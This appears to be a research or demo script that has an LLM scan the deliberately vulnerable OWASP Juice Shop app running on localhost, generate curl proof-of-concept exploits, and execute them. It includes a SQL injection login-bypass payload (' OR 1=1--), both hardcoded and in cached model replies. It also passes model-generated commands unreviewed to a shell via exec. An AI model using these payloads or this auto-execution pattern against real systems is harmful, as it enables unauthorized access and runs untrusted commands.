/* eslint-disable github/no-then */
// Please install OpenAI SDK first: `npm install openai`

const openai = require('openai')
const fs = require('fs')

const openai_client = new openai({
  baseURL: 'https://api.deepseek.com',
  apiKey: process.env.API_KEY
})

const system_prompt = `
You are the world's foremost expert in security analysis, renowned for uncovering novel and complex vulnerabilities in web applications. Your task is to perform an exhaustive static code analysis, focusing on remotely exploitable vulnerabilities including but not limited to:
1. Local File Inclusion (LFI)
2. Remote Code Execution (RCE)
3. Server-Side Request Forgery (SSRF)
4. Arbitrary File Overwrite (AFO)
5. SQL Injection (SQLI)
6. Cross-Site Scripting (XSS)
7. Insecure Direct Object References (IDOR)
Your analysis must:
- Meticulously track user input from remote sources to high-risk function sinks.
- Uncover complex, multi-step vulnerabilities that may bypass multiple security controls.
- Consider non-obvious attack vectors and chained vulnerabilities.
- Identify vulnerabilities that could arise from the interaction of multiple code components.
Output your findings in JSON format, which must and only contain analysis, confidence_score, vulnerability_types, poc as a json object.
Field analysis is Your final analysis. Output in plaintext with no line breaks.
Field confidence_score is 0-10, where 0 is no confidence and 10 is absolute certainty.
Field vulnerability_types is the type of identified vulnerabilities.
Field poc is Proof-of-concept exploit, if applicable, as we are testing a web application, please use curl command to build to poc request.
The empty json schema is
{
  "analysis":"",
  "confidence_score":0,
  "vulnerability_types": [],
  "poc": {},
}
`

const content1 = `
please help me find vulnerabilities for code below \n \`\`\`__content__from__AST__server \n \`\`\`
`

const content2 = `
We are going to have a security testing on a SQL injection, with curl command, but the request URL may not specific to our routes, please help refine URL path for POC below.
 \`__output__from_content1__\`,
the sandbox environment to verify the attack is on __output_from_readme_anaylsis, here is code block, you can reference with
\`\`\` \n __content__from__AST__server \n \`\`\`
`

let __content__from__AST__server = ''

async function main() {
  console.log('\n---\n')
  console.log(
    `\`\`\`bash
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
\`\`\``
  )

  executeCommandWithTimeout(
    `docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop`,
    3000
  )
    .then(result => console.log('执行成功:', result))
    .catch(error => console.error('执行失败:', error))
  // 使用fetch API发送GET请求
  await fetch('http://localhost:3001/analyze')
    .then(response => {
      // 检查响应是否成功
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
      return response.json() // 解析JSON响应
    })
    .then(data => {
      // 确保响应是一个数组
      if (!Array.isArray(data)) {
        throw new Error('Expected an array in the response')
      }

      // 查找filePath为routes/login.ts的对象
      const loginRoute = data.find(item => item.filePath === 'routes/login.ts')

      if (loginRoute) {
        // 打印functionContent
        //console.log('Function Content for routes/login.ts:')
        //console.log(loginRoute.functionContent)
        __content__from__AST__server = loginRoute.functionContent
      } else {
        console.log('No object found with filePath "routes/login.ts"')
      }
    })
    .catch(error => {
      console.error('Error fetching or processing data:', error)
    })
  console.log('invoke DeepSeek with prompt, for specific login function\n')
  console.log('\n---\n')
  const LLMresponse1 = await invokeLLM(
    system_prompt,
    content1.replace(
      '__content__from__AST__server',
      __content__from__AST__server
    )
  )
  console.log('\n---\n')
  /* cache from deepseek
  `
  {
  "analysis": "The code contains a critical SQL Injection vulnerability in the login function. The SQL query is constructed by directly interpolating user-controlled input (req.body.email) into the query string without any sanitization or parameterization. This allows an attacker to manipulate the SQL query structure. Additionally, the password is hashed before being included in the query, which prevents SQLi through that vector, but the email parameter remains completely vulnerable. The vulnerability is compounded by the fact that the query uses the 'plain: true' option which returns the first result directly, making it easier to exploit for authentication bypass. The verifyPreLoginChallenges and verifyPostLoginChallenges functions appear to be challenge/flag verification routines for a capture-the-flag style application, but don't introduce additional vulnerabilities.",
  "confidence_score": 9,
  "vulnerability_types": ["SQL Injection"],
  "poc": {
    "curl_command": "curl -X POST 'http://target.com/login' -H 'Content-Type: application/json' -d '{\\"email\\":\\"admin@domain.com' OR 1=1--\\", \\"password\\":\\"anypassword\\"}'"
  }
  }
  `*/
  const jsonObj = JSON.parse(LLMresponse1)

  // 提取poc.curl_command字段
  const curlCommand = extractPocCommand(jsonObj.poc)
  console.log(`\`\`\`bash
${curlCommand}
\`\`\`\n`)
  console.log('\n---\n')
  // due to some issue when tree-sitter parse the file
  const server_code = await fs.promises.readFile(
    './juice-shop/server.ts',
    'utf-8'
  )

  const LLMresponse_sandbox_url = 'http://localhost:3000'
  console.log('---')
  console.log('invoke DeepSeek with prompt for entry as server.ts\n')
  const LLMresponse2 = await invokeLLM(
    system_prompt,
    content2
      .replace('__content__from__AST__server', server_code)
      .replace('__output_from_readme_anaylsis', LLMresponse_sandbox_url)
      .replace('__output__from_content1__', curlCommand)
  )
  /*  cache from deepseek
  `{
  "analysis": "The provided code snippet shows a comprehensive Express.js application with multiple routes and security controls. The SQL injection vulnerability is present in the login route, which accepts user input for email and password without proper sanitization. The application uses Sequelize for database operations, but the login endpoint appears to directly use user-supplied input in a SQL query. The vulnerable route is '/rest/user/login' as seen in the app.post() declaration. The POC needs to target this endpoint with a crafted email parameter containing SQL injection payload.",
  "confidence_score": 9,
  "vulnerability_types": ["SQL Injection"],
  "poc": {
    "curl_command": "curl -X POST 'http://localhost:3000/rest/user/login' -H 'Content-Type: application/json' -d '{\\"email\\":\\"admin@juice-sh.op' OR 1=1--\\", \\"password\\":\\"anypassword\\"}'",
    "description": "This curl command sends a POST request to the login endpoint with a malicious email parameter containing SQL injection payload (' OR 1=1--). This should bypass authentication if the application is vulnerable to SQL injection."
  }
  }`
  */
  const jsonObj2 = JSON.parse(LLMresponse2)
  const curlCommand2 = jsonObj2.poc.curl_command
  // 使用示例
  executeCommandWithTimeout(curlCommand2, 3000)
    .then(result => console.log('执行成功:', result))
    .catch(error => console.error('执行失败:', error))
  console.log('\n---\n')
  const curlCommand_default = `curl -X POST 'http://localhost:3000/rest/user/login' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op'\\'' OR 1=1--", "password":"anypassword"}'`
  executeCommandWithTimeout(curlCommand_default, 3000)
    .then(result => console.log('执行成功:', result))
    .catch(error => console.error('执行失败:', error))
  console.log('\n---\n')
}

const { exec } = require('child_process')

function executeCommandWithTimeout(command, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const childProcess = exec(command, (error, stdout, stderr) => {
      clearTimeout(timeoutId)
      if (error) {
        reject(error)
      } else {
        resolve({ stdout, stderr })
      }
    })

    const timeoutId = setTimeout(() => {
      childProcess.kill() // 终止进程
    }, timeout)

    // 确保超时后清理定时器
    childProcess.on('exit', () => {
      clearTimeout(timeoutId)
    })
  })
}

async function invokeLLM(sys_prompt, content) {
  console.log('\n---\n')
  console.log(`ask LLM for ${content}`)
  const completion = await openai_client.chat.completions.create({
    messages: [
      { role: 'system', content: sys_prompt },
      {
        role: 'user',
        content
      }
    ],
    model: 'deepseek-chat'
  })
  console.log('\n---\n')
  console.log(`response from LLM${completion.choices[0].message.content}`)
  return JSON.stringify(extractJson(completion.choices[0].message.content))
}

function extractJson(text) {
  // 匹配 ```json 和 ``` 之间的内容
  const regex = /```json\n([\s\S]*?)\n```/
  const match = text.match(regex)

  if (match && match[1]) {
    try {
      return JSON.parse(match[1])
    } catch (e) {
      throw new Error('提取的JSON内容解析失败')
    }
  }
  throw new Error('未找到JSON内容')
}

function extractPocCommand(pocData) {
  // 情况1：直接包含命令的对象
  if (typeof pocData === 'object' && !Array.isArray(pocData)) {
    // 检查是否有直接的 curl 命令
    if (pocData['curl_command']) {
      return pocData['curl_command']
    }

    // 检查是否有嵌套的 POC 对象
    for (const key in pocData) {
      if (
        typeof pocData[key] === 'string' &&
        pocData[key].startsWith('curl ')
      ) {
        return pocData[key]
      }
    }
  }
}

main()
